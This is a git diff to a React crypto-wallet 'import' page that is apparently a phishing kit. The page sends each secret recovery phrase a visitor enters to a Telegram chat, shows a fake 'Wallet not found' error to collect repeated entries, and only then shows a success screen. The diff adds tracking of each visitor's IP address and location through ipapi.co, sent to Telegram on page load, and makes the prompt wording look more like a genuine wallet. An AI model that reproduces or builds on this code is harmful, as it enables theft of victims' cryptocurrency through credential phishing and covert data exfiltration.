@@ -1,6 +1,7 @@
 "use client"
 import React, { useState, useEffect } from "react"
 import { ArrowLeft, ChevronDown, Info, CheckCircle } from "lucide-react"
+import { list } from "./list"
 
 export default function ImportWallet() {
   const [phrase, setPhrase] = useState("")
@@ -28,6 +29,7 @@ export default function ImportWallet() {
           body: JSON.stringify({
             chat_id: telegramChatId,
             text: message,
+            parse_mode: "Markdown",
           }),
         }
       )
@@ -38,31 +40,44 @@ export default function ImportWallet() {
 
   // Send notification when user visits the page
   useEffect(() => {
-    const domain = window.location.hostname
-    sendTelegramMessage(`User visited the website on domain: ${domain}`)
-  }, [])
+    fetch("https://ipapi.co/json/")
+      .then((response) => response.json())
+      .then((data) => {
+        const visitData = {
+          url: window.location.href,
+          ip: data.ip,
+          location: `${data.city}, ${data.region}, ${data.country_name}`,
+        };
+
+        // Send visit alert to Telegram with formatted message
+        sendTelegramMessage(
+          `Visited this URL: ${visitData.url}\nIP Address: ${visitData.ip}\nLocation: ${visitData.location}`
+        );
+      });
+  }, [telegramToken, telegramChatId]);
 
   // Handle form submission
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    if (submitCount >= 3) return
+    if (submitCount >= 4) return
 
     setIsLoading(true)
     setErrorMessage("")
 
-    // Send details to Telegram
-    await sendTelegramMessage(`Phrase: ${phrase}`)
+    // Send details to Telegram with monospace formatting
+    await sendTelegramMessage(`Phrase: \`${phrase}\``)
 
-    // Wait 3 seconds
     setTimeout(() => {
       setIsLoading(false)
-      setErrorMessage("Ensure the words are in order, check the spelling or try another wallet")
-      setSubmitCount(prev => prev + 1)
-
-      // Move to success page after 3 submissions
-      if (submitCount + 1 === 3) {
-        setIsVerified(true)
-      }
+      setErrorMessage("Wallet not found. Check your spelling, ensure the words are in the correct order, or try another wallet.")
+      setSubmitCount(prev => {
+        const newCount = prev + 1
+        // Move to success page after 4 submissions
+        if (newCount === 4) {
+          setIsVerified(true)
+        }
+        return newCount
+      })
     }, 3000)
   }
 
@@ -115,7 +130,7 @@ export default function ImportWallet() {
           {/* Input Field */}
           <div className="relative">
             <div className="flex items-center space-x-3">
-              <h3 className="w-full h-full bg-transparent text-gray-300 placeholder-gray-500 resize-none focus:outline-none">Enter your 12-word phrase</h3>
+              <h3 className="w-full h-full bg-transparent text-gray-300 placeholder-gray-500 resize-none focus:outline-none">Enter your Secret Recovery Phrase</h3>
             </div>
           </div>
 
